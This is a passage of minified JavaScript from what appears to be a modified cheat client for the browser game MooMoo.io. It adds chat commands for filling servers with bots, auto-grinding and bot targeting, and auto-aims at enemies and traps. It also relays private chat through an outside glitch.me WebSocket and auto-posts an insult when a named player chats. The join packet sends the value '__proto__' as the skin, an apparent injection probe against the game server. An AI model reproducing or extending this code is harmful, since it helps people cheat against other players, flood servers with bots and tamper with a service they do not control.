                    (Ht[n] / T.mapScale) * me.width,
                    (Ht[n + 1] / T.mapScale) * me.height,
                    7,
                    ce,
                    !0
                ),
                    (n += 2);
        pi &&
            ((ce.fillStyle = "#fc5553"),
             (ce.font = "34px Hammersmith One"),
             (ce.textBaseline = "middle"),
             (ce.textAlign = "center"),
             ce.fillText(
            "x",
            (pi.x / T.mapScale) * me.width,
            (pi.y / T.mapScale) * me.height
        )),
            je &&
            ((ce.fillStyle = "#fff"),
             (ce.font = "34px Hammersmith One"),
             (ce.textBaseline = "middle"),
             (ce.textAlign = "center"),
             ce.fillText(
            "x",
            (je.x / T.mapScale) * me.width,
            (je.y / T.mapScale) * me.height
        ));
    }
}
let $n = 0;

function cf(t) {
    $n != t && (($n = t), ys());
}

function hf() {
    "block" != We.style.display
        ? ((We.style.display = "block"), (Te.style.display = "none"), Ri(), ys())
    : Kn();
}

function Kn() {
    "block" == We.style.display && ((We.style.display = "none"), Se());
}

function ff(t, n, i) {
    i
        ? t
        ? (E.tailIndex = n)
    : (E.tails[n] = 1)
    : t
        ? (E.skinIndex = n)
    : (E.skins[n] = 1),
        "block" == We.style.display && ys();
}

function ys() {
    if (E) {
        C.removeAllChildren(wr);
        let t = $n,
            n = t ? Gt : Xt;
        for (let i = 0; i < n.length; ++i)
            n[i].dontSell ||
                (function (i) {
                let o = C.generateElement({
                    id: "storeDisplay" + i,
                    class: "storeItem",
                    onmouseout: function () {
                        Se();
                    },
                    onmouseover: function () {
                        Se(n[i], !1, !0);
                    },
                    parent: wr,
                });
                C.hookTouchEvents(o, !0),
                    C.generateElement({
                    tag: "img",
                    class: "hatPreview",
                    src:
                    "./img/" +
                    (t ? "accessories/access_" : "hats/hat_") +
                    n[i].id +
                    (n[i].topSprite ? "_p" : "") +
                    ".png",
                    parent: o,
                }),
                    C.generateElement({
                    tag: "span",
                    text: n[i].name,
                    parent: o,
                }),
                    (t ? E.tails[n[i].id] : E.skins[n[i].id])
                    ? (t ? E.tailIndex : E.skinIndex) == n[i].id
                    ? C.generateElement({
                    class: "joinAlBtn",
                    style: "margin-top: 5px",
                    text: "Unequip",
                    onclick: function () {
                        Jn(0, t);
                    },
                    hookTouch: !0,
                    parent: o,
                })
                : C.generateElement({
                    class: "joinAlBtn",
                    style: "margin-top: 5px",
                    text: "Equip",
                    onclick: function () {
                        Jn(n[i].id, t);
                    },
                    hookTouch: !0,
                    parent: o,
                })
                : (C.generateElement({
                    class: "joinAlBtn",
                    style: "margin-top: 5px",
                    text: "Buy",
                    onclick: function () {
                        bo(n[i].id, t);
                    },
                    hookTouch: !0,
                    parent: o,
                }),
                   C.generateElement({
                    tag: "span",
                    class: "itemPrice",
                    text: n[i].price,
                    parent: o,
                }));
            })(i);
    }
}

function Jn(t, n) {
    if (0 == n) {
        if (E.skins[t]) E.skinIndex != t && ee.send("c", 0, t, n);
        else {
            let i = Bc.find((n) => n.id == t);
            i ? E.points >= i.price && ee.send("c", 1, t, n) : ee.send("c", 0, t, n);
        }
    } else if (1 == n) {
        if (E.tails[t]) E.tailIndex != t && ee.send("c", 0, t, n);
        else {
            let o = zc.find((n) => n.id == t);
            o ? E.points >= o.price && ee.send("c", 1, t, n) : ee.send("c", 0, t, n);
        }
    }
}

function bo(t, n) {
    ee.send("c", 1, t, n);
}

function So() {
    (We.style.display = "none"), (Te.style.display = "none"), Ri();
}

function uf() {
    let t = Nt("native_resolution");
    Sn(t ? "true" == t : "u" > typeof cordova),
        ($e = "true" == Nt("show_ping")),
        (Qt.hidden = !$e || !Jt),
        Nt("moo_moosic"),
        setInterval(function () {
        window.cordova &&
            (document
             .getElementById("downloadButtonContainer")
             .classList.add("cordova"),
             document
             .getElementById("mobileDownloadButtonContainer")
             .classList.add("cordova"));
    }, 1e3),
        Io(),
        C.removeAllChildren(pr);
    for (var n, i = 0; i < R.weapons.length + R.list.length; ++i)
        (n = i),
            C.generateElement({
            id: "actionBarItem" + n,
            class: "actionBarItem",
            style: "display:none",
            onmouseout: function () {
                Se();
            },
            parent: pr,
        });
    for (var i = 0; i < R.list.length + R.weapons.length; ++i)
        !(function (t) {
            let n = document.createElement("canvas");
            n.width = n.height = 66;
            let i = n.getContext("2d");
            if (
                (i.translate(n.width / 2, n.height / 2),
                 (i.imageSmoothingEnabled = !1),
                 (i.webkitImageSmoothingEnabled = !1),
                 (i.mozImageSmoothingEnabled = !1),
                 R.weapons[t])
            ) {
                i.rotate(Math.PI / 4 - Math.PI);
                var o = new Image();
                (jn[R.weapons[t].src] = o),
                    (o.onload = function () {
                    this.isLoaded = !0;
                    let o = 1 / (this.height / this.width),
                        a = R.weapons[t].iPad || 1;
                    i.drawImage(
                        this,
                        -(n.width * a * T.iconPad * o) / 2,
                        -(n.height * a * T.iconPad) / 2,
                        n.width * a * o * T.iconPad,
                        n.height * a * T.iconPad
                    ),
                        (i.fillStyle = "rgba(0, 0, 70, 0.1)"),
                        (i.globalCompositeOperation = "source-atop"),
                        i.fillRect(-n.width / 2, -n.height / 2, n.width, n.height),
                        (document.getElementById(
                        "actionBarItem" + t
                    ).style.backgroundImage = "url(" + n.toDataURL() + ")");
                }),
                    (o.src = "./img/weapons/" + R.weapons[t].src + ".png");
                var a = document.getElementById("actionBarItem" + t);
                (a.onmouseover = C.checkTrusted(function () {
                    Se(R.weapons[t], !0);
                })),
                    (a.onclick = C.checkTrusted(function () {
                    Yt(t, !0);
                })),
                    C.hookTouchEvents(a);
            } else {
                var o = Ss(R.list[t - R.weapons.length], !0);
                let r = Math.min(n.width - T.iconPadding, o.width);
                (i.globalAlpha = 1),
                    i.drawImage(o, -r / 2, -r / 2, r, r),
                    (i.fillStyle = "rgba(0, 0, 70, 0.1)"),
                    (i.globalCompositeOperation = "source-atop"),
                    i.fillRect(-r / 2, -r / 2, r, r),
                    (document.getElementById("actionBarItem" + t).style.backgroundImage =
                     "url(" + n.toDataURL() + ")");
                var a = document.getElementById("actionBarItem" + t);
                (a.onmouseover = C.checkTrusted(function () {
                    Se(R.list[t - R.weapons.length]);
                })),
                    (a.onclick = C.checkTrusted(function () {
                    Yt(t - R.weapons.length);
                })),
                    C.hookTouchEvents(a);
            }
        })(i);
    (jt.onchange = (t) => {
        t.target.value = (t.target.value || "").slice(0, 15);
    }),
        (jt.onkeypress = (t) => {
        if ("Enter" === t.key) return t.preventDefault(), Un.onclick(t), !1;
    }),
        (Nn.checked = uo),
        (Nn.onchange = C.checkTrusted(function (t) {
        Sn(t.target.checked);
    })),
        (xn.checked = $e),
        (xn.onchange = C.checkTrusted(function (t) {
        ($e = xn.checked),
            (Qt.hidden = !$e),
            Di("show_ping", $e ? "true" : "false");
    }));
}

function To(t, n) {
    t && (n ? (E.weapons = t) : (E.items = t)),
        n && ((E.primaryWeapon = n[0]), (E.secondaryWeapon = n[1]));
    for (var i = 0; i < R.list.length; ++i) {
        let o = R.weapons.length + i;
        document.getElementById("actionBarItem" + o).style.display =
            E.items.indexOf(R.list[i].id) >= 0 ? "inline-block" : "none";
    }
    for (var i = 0; i < R.weapons.length; ++i)
        document.getElementById("actionBarItem" + i).style.display =
            E.weapons[R.weapons[i].type] == R.weapons[i].id ? "inline-block" : "none";
}

function Sn(t) {
    (uo = t),
        (mt = (t && window.devicePixelRatio) || 1),
        (Nn.checked = t),
        Di("native_resolution", t.toString()),
        ws();
}

function df() {
    ii ? qt.classList.add("touch") : qt.classList.remove("touch");
}

function pf() {
    qt.classList.contains("showing")
        ? (qt.classList.remove("showing"), (cr.innerText = "Settings"))
    : (qt.classList.add("showing"), (cr.innerText = "Close"));
}

function Io() {
    let t = "";
    for (let n = 0; n < T.skinColors.length; ++n)
        n == fs
            ? (t +=
               "<div class='skinColorItem activeSkin' style='background-color:" +
               T.skinColors[n] +
               "' onclick='selectSkinColor(" +
               n +
               ")'></div>")
        : (t +=
           "<div class='skinColorItem' style='background-color:" +
           T.skinColors[n] +
           "' onclick='selectSkinColor(" +
           n +
           ")'></div>");
    Nh.innerHTML = t;
}

function mf(t) {
    (fs = t), Io();
}
const Ft = document.getElementById("chatBox"),
      Si = document.getElementById("chatHolder");

function Mo() {
    "block" === Si.style.display && (Ft.value && vr(Ft.value), Ri()),
        (Ft.value = "");
}

function MoMo() {
    (We.style.display = "none"),
        (Te.style.display = "none"),
        (Si.style.display = "block"),
        Ft.focus(),
        xs();
}
let gla = !0,
    popo = !1,
    rgbagamec = "rgba(15, 7, 72, 0.5)",
    autoG = {
        toggle: !1,
        toVar: 4,
        weapon: null,
    };

function vr(t) {
    if (t.startsWith(".")) {
        let n = t.split(".")[1];
        if (n.startsWith("clan")) {
            let i = t.split(".clan ")[1].slice(0, 7);
            i &&
                (ee.send("L", i),
                 addMenuChText("made new clan " + i, "pink", "", "red", !0),
                 teamz.push(i));
        } else if (n.startsWith("leave"))
            ee.send("N"), addMenuChText("left clan", "pink", "", "red", !0);
        else if (n.startsWith("chatfill")) popo = !popo;
        else if (n.startsWith("target")) {
            let o = t.split(".target ")[1];
            o &&
                Number(o) &&
                addMenuChText("bot target set to " + o, "pink", "", "red", !0);
        } else if (n.startsWith("rad")) {
            let a = t.split(".rad ")[1];
            a &&
                Number(a) &&
                addMenuChText("bot radius set to " + a, "pink", "", "red", !0);
        } else if (n.startsWith("fill"))
            addMenuChText("botting server", "pink", "", "red", !0), fillServer();
        else if (n.startsWith("clear")) resetMenuChText();
        else if (n.startsWith("accept")) {
            let r = t.split(".accept ")[1];
            r &&
                Number(r) &&
                (addMenuChText(
                "accepted " + _i(r) + " into clan",
                "pink",
                "",
                "red",
                !0
            ),
                 ee.send("P", r, 1));
        } else if (n.startsWith("record")) toggleRecording();
        else if (n.startsWith("autogrind")) {
            let s = t.split(".autogrind ")[1];
            s.startsWith("gold") || "g" == s || "1" == s
                ? (ee.send("K", 1),
                   addMenuChText("autogrinding to gold", "pink", "", "red", !0),
                   place(5, 0 - Math.PI / 4),
                   place(5, 0 + Math.PI / 4),
                   (autoG = {
                toggle: !0,
                toVar: 1,
                weapon:
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon,
            }))
            : s.startsWith("diamond") || "d" == s || "2" == s
                ? (addMenuChText("autogrinding to diamond", "pink", "", "red", !0),
                   ee.send("K", 1),
                   place(5, 0 - Math.PI / 4),
                   place(5, 0 + Math.PI / 4),
                   (autoG = {
                toggle: !0,
                toVar: 2,
                weapon:
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon,
            }))
            : s.startsWith("ruby") || "r" == s || "3" == s
                ? (addMenuChText("autogrinding to ruby", "pink", "", "red", !0),
                   ee.send("K", 1),
                   place(5, 0 - Math.PI / 4),
                   place(5, 0 + Math.PI / 4),
                   (autoG = {
                toggle: !0,
                toVar: 3,
                weapon:
                10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon,
            }))
            : addMenuChText("unknown variant type", "pink", "", "red", !0);
        } else
            n.startsWith("reconnect")
                ? (socket = new WebSocket(
                "wss://kta-communication-network-hub.glitch.me"
            ))
            : n.startsWith("help")
                ? addMenuChText(
                "clan [name]<br>leave<br>fill<br>target [sid]<br>rad [distance]<br>clear<br>record<br>toggle<br>chatfill<br>reconnect",
                "pink",
                "",
                "red",
                !0
            )
            : n.startsWith("toggle") &&
                ((gla = !gla)
                 ? ((document.getElementById("menuChatDiv").style.boxShadow =
                     "0px 0px 20px rgba(0, 0, 0, 0)"),
                    (document.getElementById("mChDiv").style.backgroundColor =
                     "rgba(0, 0, 0, 0.4)"),
                    (document.getElementById("mChBox").style.backgroundColor =
                     "rgba(0, 0, 0, 0.2)"),
                    addMenuChText(
                "toggled style to glass mode",
                "pink",
                "",
                "red",
                !0
            ),
                    (rgbagamec = "rgba(0, 0, 55, 0.55)"))
                 : ((document.getElementById("menuChatDiv").style.boxShadow =
                     "0px 0px 20px rgba(0, 0, 0, 0.8)"),
                    (document.getElementById("mChDiv").style.backgroundColor =
                     "rgba(0, 0, 0, 0.65)"),
                    (document.getElementById("mChBox").style.backgroundColor =
                     "rgba(255, 255, 255, 0.1)"),
                    addMenuChText(
                "toggled style to dark mode",
                "pink",
                "",
                "red",
                !0
            ),
                    (rgbagamec = "rgba(10, 5, 70, 0.7)")));
    } else if (isEnabled)
        document.getElementById("capital").checked
            ? ee.send("6", t.slice(0, 30).charAt(0).toUpperCase() + t.slice(1))
        : ee.send("6", t.slice(0, 30));
    else {
        let l = [E.sid + "", E.name + "", t + ""];
        socket.send(JSON.stringify(l)),
            addMenuChText(
            t,
            "#fff",
            "[PRIVATE] " + E.name + "[" + E.sid + "]:",
            "#e66532"
        ),
            (E.privateChatMessage = t),
            (E.privateChatCountdown = T.chatCountdown);
    }
}
const inputBox = document.getElementById("chatBox"),
      suggestionsContainer = document.createElement("div");

function renderSuggestions(t) {
    (suggestionsContainer.innerHTML = ""),
        t.length > 0
        ? (t.forEach((t) => {
        let n = document.createElement("div");
        (n.textContent = t),
            n.classList.add("suggestion-item"),
            n.addEventListener("click", function () {
            (inputBox.value = t), clearSuggestions();
        }),
            suggestionsContainer.insertBefore(
            n,
            suggestionsContainer.firstChild
        );
    }),
           (suggestionsContainer.style.display = "block"))
    : clearSuggestions();
}

function clearSuggestions() {
    (suggestionsContainer.innerHTML = ""),
        (suggestionsContainer.style.display = "none");
}
suggestionsContainer.setAttribute("id", "suggestions"),
    suggestionsContainer.classList.add("suggestions"),
    document.getElementById("chatHolder").appendChild(suggestionsContainer),
    inputBox.addEventListener("input", function () {
    let t = this.value.toLowerCase();
    if (t.startsWith(".")) {
        let n = [
            "clan",
            "leave",
            "fill",
            "target",
            "rad",
            "clear",
            "record",
            "toggle",
            "chatfill",
            "reconnect",
        ].filter((n) => n.toLowerCase().startsWith(t.substring(1)));
        renderSuggestions(n);
    } else clearSuggestions();
}),
    document.addEventListener("click", function (t) {
    inputBox.contains(t.target) ||
        t.target === suggestionsContainer ||
        clearSuggestions();
});
const style = document.createElement("style");

function Ri() {
    (Ft.value = ""), (Si.style.display = "none");
}

// addMenuChText(
    //     n,
    //     "#fff",
    //     i.name + "[" + i.sid + "]:",
    //     i == E || (i.team && i.team == E.team) ? "#00aaee" : "#fff"
    // )

function gf(t, n) {
    let i = _i(t);
    i &&
        ((i.chatMessage = n),
         (i.chatCountdown = T.chatCountdown)),
        i != E &&
        (n.toLowerCase().includes("pashka")
         ? ee.send("6", "pashka is a skid")
         : n.toLowerCase().includes("ferris") && ee.send("6", ""));
}

function ws() {
    (gt = window.innerWidth), (yt = window.innerHeight);
    let t = Math.max(gt / se, yt / re) * mt;
    (xt.width = gt * mt),
        (xt.height = yt * mt),
        (xt.style.width = gt + "px"),
        (xt.style.height = yt + "px"),
        M.setTransform(t, 0, 0, t, (gt * mt - se * t) / 2, (yt * mt - re * t) / 2);
}
(style.textContent = `
.suggestions {
border: none;
background-color: rgba(0, 0, 0, 0.5);
box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.2);
max-height: 400px;
overflow-y: auto;
position: absolute;
width: 250px; /* Adjusted width */
border-radius: 5px;
bottom: calc(100% + 5px); /* Changed top to bottom */
left: 50%; /* Center horizontally */
transform: translateX(-50%); /* Center horizontally */
font: 24px Ubuntu;
color: white; /* Changed from font-color to color */
font-weight: bold;
}

.suggestion-item {
padding: 8px;
cursor: pointer;
}

.suggestion-item:hover {
background-color: #f0f0f0;
}
`),
    document.head.appendChild(style),
    window.addEventListener("resize", C.checkTrusted(ws)),
    ws();
let ii;

function tt(t) {
    (ii = t), df();
}
tt(!1), (window.setUsingTouch = tt);
let yf = document.getElementById("leaderboardButton"),
    Eo = document.getElementById("leaderboard");
yf.addEventListener("touchstart", () => {
    Eo.classList.add("is-showing");
});
const ks = () => {
    Eo.classList.remove("is-showing");
};
document.body.addEventListener("touchend", ks),
    document.body.addEventListener("touchleave", ks),
    document.body.addEventListener("touchcancel", ks);
let tankBreak = !1;
if (!ho) {
    let t = function (t) {
        t.preventDefault(),
            t.stopPropagation(),
            tt(!1),
            (go = t.clientX),
            (yo = t.clientY);
    },
        n = function (t) {
            tt(!1), 1 != Ee && ((Ee = 1), it()), 0 == t.button && (tankBreak = !0);
        },
        i = function (t) {
            tt(!1), 0 != Ee && ((Ee = 0), it()), 0 == t.button && (tankBreak = !1);
        };
    var o = t,
        a = n,
        r = i;
    let s = document.getElementById("touch-controls-fullscreen");
    (s.style.display = "block"),
        s.addEventListener("mousemove", t, !1),
        s.addEventListener("mousedown", n, !1),
        s.addEventListener("mouseup", i, !1);
}
let Qn = !1,
    Po;

function wf() {
    let t = 0,
        n = 0,
        i;
    if (ii) {
        if (!Qn) return;
        i = Po;
    }
    for (let o in Ii) {
        let a = Ii[o];
        (t += !!He[o] * a[0]), (n += !!He[o] * a[1]);
    }
    if (((0 != t || 0 != n) && (i = Math.atan2(n, t)), void 0 !== i))
        return C.fixTo(i, 2);
}
let Ti;

function vs() {
    if (E) {
        if (autohitting && 0 == E.reloads[E.primaryWeapon])
            return caf(enemy, E) - Math.PI;
        if (
            E.inTrap &&
            0 ==
            E.reloads[10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon]
        )
            return caf(E.inTrap, E) - Math.PI;
        if (
            E.obj &&
            0 ==
            E.reloads[10 == E.secondaryWeapon ? E.secondaryWeapon : E.primaryWeapon]
        )
            return caf(E.obj, E) - Math.PI;
        else if (autoG.toggle) return 0;
        else if (E && E.alive && !E.lockDir && !ii)
            return (
                (Ti = Math.atan2(yo - yt / 2, go - gt / 2)), C.fixTo(Ti || 0, 2), Ti
            );
        else return 0;
    }
}
var He = {},
    Ii = {
        87: [0, -1],
        38: [0, -1],
        83: [0, 1],
        40: [0, 1],
        65: [-1, 0],
        37: [-1, 0],
        68: [1, 0],
        39: [1, 0],
    };

function xs() {
    (He = {}), ee.send("e");
}

function Co() {
    return "block" != Te.style.display && "block" != Si.style.display;
}

function kf(t) {
    let n = t.which || t.keyCode || 0;
    27 == n
        ? So()
    : E &&
        E.alive &&
        Co() &&
        (He[n] ||
         ((He[n] = 1),
          69 == n
          ? bf()
          : 67 == n
          ? of()
          : 70 == n
          ? ((placer.itemIndex = 4), (placer.toggle = !0))
          : 86 == n
          ? ((placer.itemIndex = 2), (placer.toggle = !0))
          : 222 == n
          ? (freeCam.doMove = !freeCam.doMove)
          : 72 == n
          ? ((placer.itemIndex = 5), (placer.toggle = !0))
          : 90 == n
          ? (millData.toggle = !millData.toggle)
          : 82 == n
          ? (inztakillData.toggle = !inztakillData.toggle)
          : 88 == n
          ? xf()
          : null != E.weapons[n - 49]
          ? Yt(E.weapons[n - 49], !0)
          : null != E.items[n - 49 - E.weapons.length]
          ? Yt(E.items[n - 49 - E.weapons.length])
          : 81 == n
          ? Yt(E.items[0])
          : 82 == n
          ? Ao()
          : Ii[n]
          ? Mi()
          : 32 == n && ((Ee = 1), it())));
}

function vf(t) {
    if (E && E.alive) {
        let n = t.which || t.keyCode || 0;
        if (([70, 86, 72].includes(n) && (placer.toggle = !1), 13 == n)) Mo();
        else if (191 == n) {
            if ("block" === Te.style.display) return;
            MoMo();
        } else
            Co() &&
                He[n] &&
                ((He[n] = 0), Ii[n] ? Mi() : 32 == n && ((Ee = 0), it()));
    }
}

function it() {
    E &&
        E.alive &&
        (-1 == E.buildIndex
         ? ee.send("K", 1)
         : ee.send("d", Ee, E.buildIndex >= 0 ? vs() : null));
}
window.addEventListener("keydown", C.checkTrusted(kf)),
    window.addEventListener("keyup", C.checkTrusted(vf));
let Tn;

function Mi() {
    let t = wf();
    (null == Tn || null == t || (Math.abs(t - Tn) > 0.3 && !autopuzhing)) &&
        (ee.send("a", t), (Tn = t));
}

function xf() {
    (E.lockDir = E.lockDir ? 0 : 1), ee.send("K", 0);
}

function Ao() {
    ee.send("S", 1);
}

function bf() {
    ee.send("K", 1);
}

function Yt(t, n) {
    ee.send("G", t, n);
}

function bs() {
    (Qt.hidden = !$e),
        (window.onbeforeunload = function (t) {
        return "Are you sure?";
    }),
        window.FRVR && window.FRVR.tracker.levelStart("game_start"),
        Di("moo_name", jt.value),
        !Jt && cs() && (Jt = !0),
        _h.stop("menu"),
        ms("Loading..."),
        (document.getElementById("menuChatDiv").style.opacity = "1"),
        (document.getElementById("menuChatDiv").style.visibility = "visible"),
        (document.getElementById("allah").style.opacity = "1"),
        (document.getElementById("allah").style.visibility = "visible"),
        ee.send("M", {
        name: jt.value,
        moofoll: xi,
        skin: "__proto__",
    }),
        Sf();
}

function Sf() {
    var t = document.getElementById("ot-sdk-btn-floating");
    t && (t.style.display = "none");
}

function Tf() {
    var t = document.getElementById("ot-sdk-btn-floating");
    t && (t.style.display = "block");
}
window.io = ee;
let Ei = !0,
    In = !1;

function If(t) {
    (Et.style.display = "none"),
        (Zt.style.display = "block"),
        (Oi.style.display = "none"),
        (He = {}),
        (mo = t),
        (Ee = 0),
        (Jt = !0),
        Ei && ((Ei = !1), (et.length = 0)),
        ho &&
        Mh.enable({
        onStartMoving() {
            Kn(), Xn(), tt(!0), (Qn = !0);
        },
        onStopMoving() {
            (Qn = !1), Mi();
        },
        onRotateMoving(t, n) {
            n.force < 0.25 ||
                ((Po = -n.angle.radian), Mi(), In || (Ti = -n.angle.radian));
        },
        onStartAttacking() {
            Kn(), Xn(), tt(!0), (In = !0), E.buildIndex < 0 && ((Ee = 1), it());
        },
        onStopAttacking() {
            E.buildIndex >= 0 && ((Ee = 1), it()), (Ee = 0), it(), (In = !1);
        },
        onRotateAttacking(t, n) {
            n.force < 0.25 || (Ti = -n.angle.radian);
        },
    });
}

function Mf(t, n, i, o) {}
let mi = 99999;

function Ef() {
    (Jt = !1), Tf();
    try {
        factorem.refreshAds([2], !0);
    } catch {}
    (us.style.display = "none"),
        So(),
        (pi = {
        x: E.x,
        y: E.y,
    }),
        (Et.style.display = "none"),
        (Wt.style.display = "none"),
        (Wt.style.fontSize = "0px"),
        (mi = 0),
        setTimeout(function () {
        (Zt.style.display = "block"),
            (Oi.style.display = "block"),
            (Wt.style.display = "none");
    }, T.deathFadeout),
        wo();
}

function Pf(t) {
    E && ue.removeAllItems(t);
}

function Do() {
    (Hh.innerText = E.points),
        (Fh.innerText = E.food),
        (Vh.innerText = E.wood),
        (Uh.innerText = E.stone),
        (Lh.innerText = E.kills);
}
const Vt = {},
      Mn = ["crown", "skull", "inztaTarget"];

function Af() {
    for (let t = 0; t < Mn.length; ++t)
        if ((console.log(Mn[t]), "inztaTarget" == Mn[t])) {
            var n = new Image();
            (n.onload = function () {
                this.isLoaded = !0;
            }),
                (n.src =
                 "https://media.discordapp.net/attachments/1211002149857656993/1223671634989289632/84346830-the-arrows-pointing-to-the-center-of-the-circle-vector-illustration-removebg-preview.png?ex=661ab404&is=66083f04&hm=370cf3894225b31bd440e528f301b4ae68a660ee78251db8cddffe4d03c0ab51&=&format=webp&quality=lossless&width=510&height=510"),
                (Vt[Mn[t]] = n);
        } else {
            var n = new Image();
            (n.onload = function () {
                this.isLoaded = !0;
            }),
                (n.src = "./img/icons/" + Mn[t] + ".png"),
                (Vt[Mn[t]] = n);
        }
}
const ut = [];

function Oo(t, n) {
    if (((E.upgradePoints = t), (E.upgrAge = n), t > 0)) {
        (ut.length = 0), C.removeAllChildren(ht);
        for (var i = 0; i < R.weapons.length; ++i)
            if (
                R.weapons[i].age == n &&
                (null == R.weapons[i].pre || E.weapons.indexOf(R.weapons[i].pre) >= 0)
            ) {
                var o = C.generateElement({
                    id: "upgradeItem" + i,
                    class: "actionBarItem",
                    onmouseout: function () {
                        Se();
                    },
                    parent: ht,
                });
                (o.style.backgroundImage = document.getElementById(
                    "actionBarItem" + i
                ).style.backgroundImage),
                    ut.push(i);
            }
        for (var i = 0; i < R.list.length; ++i)
            if (
                R.list[i].age == n &&
                (null == R.list[i].pre || E.items.indexOf(R.list[i].pre) >= 0)
            ) {
                let a = R.weapons.length + i;
                var o = C.generateElement({
                    id: "upgradeItem" + a,
                    class: "actionBarItem",
                    onmouseout: function () {
                        Se();
                    },
                    parent: ht,
                });
                (o.style.backgroundImage = document.getElementById(
                    "actionBarItem" + a
                ).style.backgroundImage),
                    ut.push(a);
            }
        for (var i = 0; i < ut.length; i++)
            !(function (t) {
                let n = document.getElementById("upgradeItem" + t);
                (n.onmouseover = function () {
                    R.weapons[t]
                        ? Se(R.weapons[t], !0)
                    : Se(R.list[t - R.weapons.length]);
                }),
                    (n.onclick = C.checkTrusted(function () {
                    ee.send("H", t);
                })),
                    C.hookTouchEvents(n);
            })(ut[i]);
        ut.length
            ? ((ht.style.display = "block"),
               (ri.style.display = "block"),
               (ri.innerHTML = "SELECT ITEMS (" + t + ")"))
        : ((ht.style.display = "none"), (ri.style.display = "none"), Se());
    } else (ht.style.display = "none"), (ri.style.display = "none"), Se();
}

function Ro(t, n, i) {
    null != t && (E.XP = t),
        null != n && (E.maxXP = n),
        null != i && (E.age = i),
        i == T.maxAge
        ? ((gr.innerHTML = "MAX AGE"), (yr.style.width = "100%"))
    : ((gr.innerHTML = "AGE " + E.age),
       (yr.style.width = (E.XP / E.maxXP) * 100 + "%"));
}

function Df(t) {
    C.removeAllChildren(mr);
    let n = 1;
    for (let i = 0; i < t.length; i += 3) {
        var o;
        (o = i),
            C.generateElement({
            class: "leaderHolder",
            parent: mr,
            children: [
                C.generateElement({
                    class: "leaderboardItem",
                    style:
                    "font-size: 16px; color:" +
                    (t[o] == mo ? "rgba(255,255,255,1)" : "rgba(255,255,255,0.5)"),
                    text: "" != t[o + 1] ? t[o + 1] : "Unknown",
                }),
                C.generateElement({
                    class: "KTAMODOP2024FRNOCAPGGEZ",
                    text: "‎ " + C.kFormat(t[o + 2]),
                    style:
                    "font-size: 16px; color:" +
                    (t[o] == mo ? "rgba(255,255,255,1)" : "rgba(255,255,255,0.5)"),
                }),
            ],
        }),
            n++;
    }
}
let xr = null;
var freeCam = {
    doMove: !1,
    x: !1,
    y: !1,
    dir: void 0,
};
let loookjoni = !1,
    started = !1;

function Of() {
    M.isContextLost() &&
        !loookjoni &&
        (alert("Game has crashed. Error Info: 2D Rendering Context Lost"),
         (loookjoni = !0),
         (window.onbeforeunload = () => {}),
         window.location.reload());
    {
        if (E && (!yn || It - yn >= 1e3 / T.clientSendRate)) {
            yn = It;
            let t = vs();
            xr !== t && ((xr = t), ee.send("D", t));
        }
        if (
            (mi < 120 &&
             ((mi += 0.1 * be),
              (Wt.style.fontSize = Math.min(Math.round(mi), 120) + "px")),
             E)
        ) {
            let n = C.getDistance(Re, _e, E.x, E.y),
                i = C.getDirection(E.x, E.y, Re, _e),
                o = Math.min(0.0045 * n * be, n);
            if (freeCam.doMove)
                void 0 !== freeCam.dir &&
                    ((Re += 20 * Math.cos(freeCam.dir)),
                     (_e += 20 * Math.sin(freeCam.dir)));
            else if (n > 0.05) {
                let a = Re + o * Math.cos(i),
                    r = _e + o * Math.sin(i);
                (Re = Math.max(
                    T.maxScreenWidth / 2,
                    Math.min(14400 - T.maxScreenWidth / 2, a)
                )),
                    (_e = Math.max(
                    T.maxScreenHeight / 2,
                    Math.min(14400 - T.maxScreenHeight / 2, r)
                ));
            } else (Re = E.x), (_e = E.y);
        } else (Re = T.mapScale / 2), (_e = T.mapScale / 2);
        let s = It - 1e3 / T.serverUpdateRate;
        for (var l, c = 0; c < J.length + ye.length; ++c)
            if ((y = J[c] || ye[c - J.length]) && y.visible) {
                if (y.forcePos) (y.x = y.x2), (y.y = y.y2), (y.dir = y.d2);
                else {
                    let d = y.t2 - y.t1,
                        h = (s - y.t1) / d;
                    y.dt += be;
                    let u = Math.min(1.7, y.dt / 170);
                    var l = y.x2 - y.x1;
                    (y.x = y.x1 + l * u),
                        (y.rt = Math.min(1, y.dt / (1e3 / 9))),
                        (l = y.y2 - y.y1),
                        (y.y = y.y1 + l * u),
                        (y.dir = Math.lerpAngle(y.d2, y.d1, Math.min(1.2, h)));
                }
            }
        let p = Re - se / 2,
            f = _e - re / 2;
        T.snowBiomeTop - f <= 0 && T.mapScale - T.snowBiomeTop - f >= re
            ? ((M.fillStyle = "#b6db66"), M.fillRect(0, 0, se, re))
        : T.mapScale - T.snowBiomeTop - f <= 0
            ? ((M.fillStyle = "#dbc666"), M.fillRect(0, 0, se, re))
        : T.snowBiomeTop - f >= re
            ? ((M.fillStyle = "#fff"), M.fillRect(0, 0, se, re))
        : T.snowBiomeTop - f >= 0
            ? ((M.fillStyle = "#fff"),
               M.fillRect(0, 0, se, T.snowBiomeTop - f),
               (M.fillStyle = "#b6db66"),
               M.fillRect(0, T.snowBiomeTop - f, se, re - (T.snowBiomeTop - f)))
        : ((M.fillStyle = "#b6db66"),
           M.fillRect(0, 0, se, T.mapScale - T.snowBiomeTop - f),
           (M.fillStyle = "#dbc666"),
           M.fillRect(
            0,
            T.mapScale - T.snowBiomeTop - f,
            se,
            re - (T.mapScale - T.snowBiomeTop - f)
        )),
            Ei ||
            ((ct += wn * T.waveSpeed * be) >= T.waveMax
             ? ((ct = T.waveMax), (wn = -1))
             : ct <= 1 && (ct = wn = 1),
             (M.globalAlpha = 1),
             (M.fillStyle = "#dbc666"),
             Tr(p, f, M, 400),
             (M.fillStyle = "#91b2db"),
             Tr(p, f, M, (ct - 1) * 250)),
            (M.lineWidth = 4),
            (M.strokeStyle = "#000"),
            (M.globalAlpha = 0.05);
        let gridWay;
        function as(a = document.getElementById("grid").value) {
            if(a == "4x4") {
                gridWay = 4;
            } else if (a == "8x8") {
                gridWay = 8;
            } else if (a == "16x16") {
                gridWay = 16;
            } else if (a == "default") {
                gridWay = 18;
            } else if (a == "32x32") {
                gridWay = 32;
            } else if (a == "chunk based") {
                gridWay = 1;
            }
        };
        as();
        if(gridWay && document.getElementById("gridToggle").checked) {
            M.beginPath();
